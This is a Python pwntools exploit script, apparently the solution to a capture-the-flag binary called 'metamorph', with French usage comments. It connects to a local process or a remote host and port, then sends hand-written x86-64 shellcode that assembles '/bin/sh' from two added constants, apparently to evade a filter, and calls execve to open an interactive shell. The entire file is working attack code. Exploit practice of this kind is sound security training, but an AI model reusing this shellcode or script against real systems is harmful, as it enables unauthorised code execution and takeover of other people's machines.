#!/usr/bin/env python3

from pwn import *
from sys import argv

def attach_gdb(r):
    if args.GDB:
        gdb.attach(r, gdbscript="""
b * transform
c
        """)

def connect(bin_name):
    if args.REMOTE:
        print(argv)
        if len(argv) < 3:
            print("Usage python3 solve.py REMOTE <address> <port>")
            exit(1)
        
        return remote(argv[1], argv[2])
    return process(bin_name)

def exploit(e,r):
	shellcode_asm = """
		mov rdx, 0x343997b734b117
		mov rcx, 0x343997b734b118
		add rdx, rcx
		push rdx
		push rsp
		pop rdi
		mov rcx, 0
		push rcx
		mov al, 59
		push rsp
		pop rdx
		push rsp
		pop rcx
		mov rsi, rcx
		syscall
	"""
	shellcode = asm(shellcode_asm)
	r.sendline(shellcode)
	r.interactive()


# USAGE : python3 template.py [REMOTE] [GDB]

# Pour tester : python3 template.py
# Pour debugger : python3 template.py GDB
# Pour récupérer le flag : python3 template.py REMOTE <addr> <port>

bin_name = "./metamorph"
context.binary = e = ELF(bin_name)
r = connect(bin_name)

attach_gdb(r)
exploit(e,r)